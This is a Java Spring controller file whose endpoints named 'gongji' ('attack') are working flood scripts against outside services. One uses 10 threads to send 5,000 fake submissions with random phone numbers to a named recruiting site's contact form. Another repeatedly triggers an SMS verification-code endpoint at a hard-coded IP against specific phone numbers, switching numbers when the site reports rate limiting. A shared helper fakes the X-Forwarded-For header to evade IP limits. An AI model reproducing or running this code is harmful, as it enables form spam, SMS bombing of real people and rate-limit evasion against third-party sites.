package com.dream.test;
import com.dream.common.service.cache.CookieUtils;
import com.dream.common.service.cache.RedisUtil;
import com.dream.common.util.ObjectUtils;
import com.dream.common.dao.user.UserDao;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.NameValuePair;
import org.apache.commons.httpclient.methods.PostMethod;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.annotation.Resource;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

@Controller
public class TestController {
    @Resource
    private RedisUtil redisUtil;
    @Autowired
    private UserDao userDao;

    @RequestMapping("/login1")
    public String test() {

        return "log2in";
    }

    private static int number = 1;

    @RequestMapping("/gongji")
    public String test2() throws Exception {
        Map<String, String> param = new HashMap<>();
        param.put("Name", "aa");
        param.put("Mobile", "16562625424");
        param.put("ExpectCity", "dd1");
        param.put("ExpectJob", "dd");
        for (int j = 0; j < 10; j++) {
            new Thread(() -> {
                for (int i = 0; i < 500; i++) {
                    int a = (int) (Math.random() * 10);
                    int b = (int) (Math.random() * 10);
                    int c = (int) (Math.random() * 10);
                    int d = (int) (Math.random() * 10);
                    param.put("Mobile", "165" + a + "26" + b + c + "42" + d);
                    String s = doPost("http://www.letiao.com/talents/addcontact", param);
                    System.out.println("第" + number + "次请求：结果为" + s + "线程为" + Thread.currentThread().getName());
                    number++;
                }
            }).start();

        }
        return "log2in";
    }
    @RequestMapping("/gongji2")
    public String test22(){
        Map<String, String> param = new HashMap<>();
        for (int i = 0; i <101 ; i++) {
            String s = doPost("http://180.97.80.16:8080/Account/GetMobileCode?token=", param);
            if("{\"errcode\":10019,\"errmsg\":\"获取验证码过于频繁，请稍后再试\"}".equals(s)){
                param.put("mobile", "18911461974");
            }else{
                param.put("mobile", "18911461972");
        }
            System.out.println(s);
        }
        return "log2in";
    }
        public static String doPost (String url, Map < String, String > params){
            StringBuffer result = new StringBuffer();
            HttpClient client = new HttpClient();
            PostMethod method = new PostMethod(url);
            method.addRequestHeader("x-forwarded-for", "27.114.26.222");
            method.getParams().setParameter("http.protocol.content-charset", "UTF-8");
            if (ObjectUtils.isNotNull(params)) {
                NameValuePair[] e = new NameValuePair[params.size()];
                int str = 0;

                Map.Entry entry;
                for (Iterator i$ = params.entrySet().iterator(); i$.hasNext(); e[str++] = new NameValuePair((String) entry.getKey(), (String) entry.getValue())) {
                    entry = (Map.Entry) i$.next();
                }

                method.setRequestBody(e);
            }

            try {
                client.executeMethod(method);
                if (method.getStatusCode() == 200) {
                    BufferedReader var14 = new BufferedReader(new InputStreamReader(method.getResponseBodyAsStream(), "UTF-8"));
                    String var15 = null;

                    while ((var15 = var14.readLine()) != null) {
                        result.append(var15);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                method.releaseConnection();
            }

            return result.toString();
        }
    @ResponseBody
    @RequestMapping("/set")
    public String test12(HttpServletResponse response) {
        CookieUtils.setCookie(response,"test","123",60000);
        return "123";
    }
    @ResponseBody
    @RequestMapping("/get")
    public String test13(HttpServletRequest request) {
        Cookie test = CookieUtils.getCookie(request, "test");
        test.getValue();
        return "123";
    }
}
